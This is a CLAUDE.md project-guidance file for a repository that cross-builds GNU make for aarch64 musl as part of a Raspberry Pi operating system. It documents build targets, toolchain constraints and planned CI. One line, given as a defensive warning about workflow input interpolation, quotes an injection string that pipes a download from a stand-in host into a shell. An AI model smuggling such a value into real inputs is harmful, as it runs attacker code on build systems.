# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Status

**The build is implemented and green end to end.** [Makefile](Makefile) fetches the GNU make release tarball, builds a musl sysroot, cross-builds `make` for aarch64 and packs it as a release asset. Verified on macOS/arm64 against GCC 15.2.0: `usr/bin/make` at 270,896 bytes stripped, AArch64 ELF on `ld-musl-aarch64.so.1`, `DT_NEEDED` of `libc.so` and nothing else, packing to a **112 KB** `dist/sepiaos-make-4.4.1-aarch64-musl.tar.xz`.

**That is a layout and linkage proof, not a behavioural one.** Nothing has yet *run* the binary — that needs a board or an emulator, and until it happens "make works on the device" is a claim.

What does not exist yet: `.github/workflows/` (both `ci.yml` and `release.yml`), and any consumer in `../rootfs`.

## Commands

```sh
gmake help               # every target, with the variables that steer them
gmake toolchain-check    # compile and link C against musl, both ways
gmake sysroot-check      # prove C links dynamically against build/sysroot
gmake make               # ./configure + ./build.sh - the cross-build
gmake stage-check        # aarch64, musl loader, depends on nothing but musl
gmake dist               # dist/sepiaos-make-<version>-aarch64-musl.tar.xz
gmake <thing>-info       # what version, from where, how big
gmake clean              # drop build/, keep downloads/
gmake -s print-DIST_ASSET   # read any variable's value
```

`gmake make` is the aggregate goal — the target is named after the product, as `../llvm`'s is named `llvm`.

**A full build with no toolchain in `downloads/` fetches a few hundred MiB.** To iterate without that, point `CROSS_COMPILE` at a toolchain a sibling already extracted — this is how the build was verified:

```sh
gmake CROSS_COMPILE=../llvm/downloads/toolchain/messense-15.2.0-aarch64-darwin/bin/aarch64-unknown-linux-musl- stage-check
```

`stage-check` is the fast regression gate. Editing the `Makefile` re-runs the musl build (a minute or two), because `Makefile` is a prerequisite of the sysroot per the house rule that editing a recipe rebuilds what it builds.

## What This Repository Is For

SepiaOS is an operating system for Raspberry Pi that reuses the kernel and firmware from Raspberry Pi OS; everything above the kernel is custom. Targets: Pi Zero 2 W, Pi 3, Pi 4, Pi 5, CM4, CM5.

Four repositories are checked out side by side and opened together via [../SepiaOS.code-workspace](../SepiaOS.code-workspace). Each pushes to `git@github.com:Sepia-OS/<name>.git`:

| | |
|---|---|
| [../boot](../boot) | the FAT boot partition — complete, released, CI'd. The smallest and clearest model of the house style. |
| [../rootfs](../rootfs) | the ext4 root filesystem: cross-toolchain, musl, busybox, kernel modules, bootable image. Complete. |
| [../llvm](../llvm) | clang/lld cross-built to run *on* the Pi, against musl. Complete and released. |
| `.` (this repo) | GNU `make`, the same way. |

This builds `make` **for the device, not for the build host**: an aarch64 binary that runs on the Pi beside the on-device clang. `../llvm` gives the card a compiler; this gives it a build driver.

## Decisions Already Taken

Each of these was open when the Makefile was written, and each is settled with evidence. Do not re-open them without new evidence.

- **The sources are the release tarball, not a git clone.** The Savannah tree ships `configure.ac`, `Makefile.am`, `build.cfg.in`, `bootstrap` and `bootstrap.conf` — and **no `configure`, no `Makefile.in`**. A checkout therefore cannot be configured until `./bootstrap` has fetched gnulib and regenerated them, which would add autoconf, automake, autopoint and gettext to every development machine and to CI. `README.md` records this and the `git://` URL is documented as upstream's development tree.
- **The version is pinned with a committed digest.** GNU publishes a detached GPG signature but no sha256 sidecar, so the digest is recorded on first fetch and checked on every fetch after — the idiom `../llvm` and `../rootfs` both use. `checksums/` holds `make-4.4.1.sha256` and `musl-1.2.6.sha256`.
- **`musl-1.2.6.sha256` is byte-identical in all three repositories** — checked, not assumed. That is the cross-repo invariant working: `rootfs` ships musl 1.2.6, and both `llvm` and this repo build the same source so the dynamically linked products run against what is actually on the card. `rootfs` resolves musl as "latest" by default, so when it moves, both pins move with it.
- **Installation is a staged copy under `DESTDIR`, never a real `/usr/bin`.** See the constraint below for why upstream's own install path cannot be used.
- **`build.sh` is upstream's**, so this repo stays what the siblings are: one Makefile, no other build script.

## Non-Obvious Constraints

All established by running the build, and each one silently produces a broken or confusing result if violated:

- **`MAKE_VERSION` is a GNU make built-in**, holding the version of the `make` reading the file — which the ≥ 4.0 prerequisite check tests. The upstream release to build is therefore `GNU_MAKE_VERSION`. Naming it the obvious thing would turn a version override into a broken prerequisite check.
- **`-std=gnu17` is load-bearing, and the failure is cross-build-only.** GCC 15 defaults to C23, where an empty parameter list means `(void)`, and make 4.4.1's bundled gnulib still writes `extern char *getenv ();` in `lib/fnmatch.c`. That is now an error, not a warning: *"conflicting types for 'getenv'; have 'char \*(void)'"*, ~15 files into `build.sh`. It never appears in a native build, because `configure` cannot run its "does the system fnmatch work" probe against the target and so conservatively compiles the gnulib replacement — a file a native glibc build never touches.
- **`CC`, `AR`, `RANLIB` and `STRIP` are passed to `configure` explicitly.** Autoconf's `--host` search looks for `aarch64-unknown-linux-musl-ar` on `PATH`, which is not there (the toolchain lives under `downloads/`) and is not even the right name on Linux, where bootlin calls its tools `aarch64-linux-*`. It would then fall back to the **host's** `ar` and produce a Mach-O archive that the aarch64 link cannot use.
- **Upstream's documented install path cannot work here.** `README.in` says to run `./make install` using the binary just built — which is aarch64 and will not execute on the build host. Running the *host's* make against the generated Makefile would work but recompiles the whole program a second time to produce the binary `build.sh` already linked, so the recipe copies it into the stage instead. Do not read `cannot execute binary file` as a broken cross-compile.
- **`--without-guile` is not tidiness.** Guile is auto-detected through `pkg-config`, which on a developer's macOS box finds Homebrew's **host** guile and configures a target binary against it.
- **`build.sh` links `makenew` and then renames it**, and reads every value it compiles with — `CC`, `CFLAGS`, `LDFLAGS`, `AR` — from `./build.cfg`, which `configure` generates from `build.cfg.in`. So all cross settings go on the `configure` line and the script needs no cross awareness. The recipe asserts `build.cfg` exists before running it, because without it the script fails inside `.` with no useful message.
- **The staged tree needs its own signature.** `WITH_STRIP` and `PREFIX` change what lands in it without changing any file it is built from, so `$(STAGE_STAMP)` taking the built binary as its only prerequisite would make `WITH_STRIP=0 gmake stage` report "Nothing to be done" and hand back the stripped tree. Verified both ways: 308K stripped, 340K not, re-staged each time. Any new variable that changes what ships must go into `STAGE_SIG` or `BUILD_SIG`.
- **The messense toolchain ships both tool prefixes** — `aarch64-linux-musl-*` and `aarch64-unknown-linux-musl-*` — and `-dumpmachine` reports `aarch64-unknown-linux-musl`. `TC_PREFIX` uses the full triple, matching `../llvm`.
- **`stage-check` proves linkage and layout, and nothing else.** It reads the ELF header, the interpreter and the full `DT_NEEDED` closure. It does not run the binary, and nothing here can. `../llvm` shipped a libc++ whose `DT_NEEDED libatomic.so.1` referenced no symbol at all and killed every program at exec on a card without it — the closure check is there because of that.

## The Toolchain

Read out of `../llvm/Makefile` and `../llvm/CLAUDE.md`, where it was established by experiment. Do not "simplify" it:

- **The toolchain is the musl-targeting one, and it differs by build host** — messense publishes darwin-hosted builds only, bootlin (Buildroot) publishes Linux-hosted x86_64 builds only. Both are fetched by one recipe differing only in `TC_PREFIX`, `TC_ARCHIVE`, `TC_URL` and `TC_SUMS`, with `CROSS_COMPILE` as the escape hatch.
- **`aarch64-unknown-linux-musl` is pinned, not inherited.** The vendors disagree — bootlin's compiler calls itself `aarch64-buildroot-linux-musl` — and an artifact whose target depended on which machine cut the release would be confusing.
- **Do not use `../rootfs`'s toolchain.** It is `aarch64-unknown-linux-gnu` GCC. GNU make is C, so it would build — but against glibc, and this binary has to link against the musl that is on the card.
- **The sysroot is musl plus UAPI headers.** musl installs libc headers and nothing else, so the Linux UAPI headers are copied from the cross-toolchain's own `-print-sysroot`. It costs nothing and cannot drift from the compiler.
- **Never ship a libc.** `dist` refuses to pack a tree containing `libc.so*` or `ld-musl-*`: the card's musl comes from `rootfs`, and a second copy is two libcs disagreeing.

## Conventions Inherited

Verified across `../boot`, `../rootfs` and `../llvm`, and followed here:

- **`gmake`, not `make`.** Hard error below GNU Make 4.0 — macOS's 3.81 compares timestamps only to the second and silently reuses stale outputs after a fast edit.
- **Nothing needs root**, on macOS or Linux.
- **Directory split:** `downloads/` (immutable upstream artifacts, survive `clean`), `build/` (everything generated, including the unpacked source tree — `build.sh` compiles in-tree, so it is a build artifact), `dist/`, `checksums/`.
- **A variable override touches no file, so Make cannot see it.** Hence the `FORCE` + `cmp -s` signature stamps. `gmake -n` **cannot** test this — `FORCE` makes every stamp look dirty under dry-run, so both cases look identical.
- **Target naming:** an aggregate goal, plus `<thing>-info` and `<thing>-check`. Every aggregate goal ends with a `READY` line whether or not anything was rebuilt — a satisfied phony goal otherwise prints nothing, which reads exactly like a broken target.
- **`print-%` exposes any variable to CI**, which makes the names it is called with a CI contract.
- **`.SHELLFLAGS := -eu -o pipefail`.** A bare `grep` that matches nothing aborts the recipe, and a pipeline ending in `head` or `grep -m1` SIGPIPEs its producer and **fails after printing the right answer** — `musl_version_of` reads in two steps for exactly that reason.
- **Noisy tools log to a file and only their tail surfaces on failure** (`configure.log`, `build.log`). CI must upload those or a failure is 30 lines out of thousands.
- **The `.gitignore` deliberately omits the stock toptal C/C++ section.** Its `*.d` pattern also matches *directories* named `*.d`, which is how `../rootfs` silently failed to commit `overlay/etc/init.d`. Keep it omitted. (Its header comment still reads `### SepiaOS llvm build output ###` from the copy.)
- **Apache 2.0** for this repository; the packaged GNU make is GPLv3 and its `COPYING` ships inside the release asset.
- **`README.md` is the specification and stays in sync.** Changing a target, a variable or a default means updating it in the same change.

## CI and Releases

Not written yet. Both files come as a pair in every sibling, and `../boot/docs/CI.md` is the full reasoning:

- **`ci.yml` builds on every commit on every branch and every PR against `main`**, in `debian:trixie-slim`. This build is seconds, not hours, so there is no reason to narrow it.
- **Build tools go in *before* `actions/checkout`.** Without `git` in the container, checkout silently degrades to a tarball download.
- **Workflows call only documented `make` targets**, so any CI failure reproduces locally verbatim.
- **Releases are never automatic.** Manual `workflow_dispatch` takes a version; a `gate` job validates it, resolves `main`'s head **once**, refuses a commit with no green CI run for that exact commit, and branches `main` to `rel-<version>`; `build` runs on that branch; `rollback` deletes it if the build fails.
- **`inputs.version` reaches bash through `env:`, never `${{ }}` interpolation into a script line** — the substitution happens before bash parses it, so `x"; curl evil | sh; #` would otherwise run. Validate against `^[0-9][0-9A-Za-z.+-]*$`.
- Only the publishing job gets `contents: write`; `GITHUB_TOKEN` is the only credential needed.
- The Linux container gets the **bootlin** toolchain, which this build has never exercised — macOS was the development host. Expect the first CI run to be where that path is proven.

## Build Environment

The user develops on **macOS** (`darwin`) with the repositories under `~/Projects/RaspberryPi/SepiaOS/`.

- **`gmake` (`brew install make`)**, not `/usr/bin/make`.
- Binaries built on macOS and on Linux are not byte-identical, so — as `../rootfs` states outright — **macOS is the development host and release builds are cut on Linux**.
- Required tools: `gmake`, `curl`, `tar`, `xz`. Notably *not* the autotools: that is a direct consequence of building the release tarball rather than a git checkout.
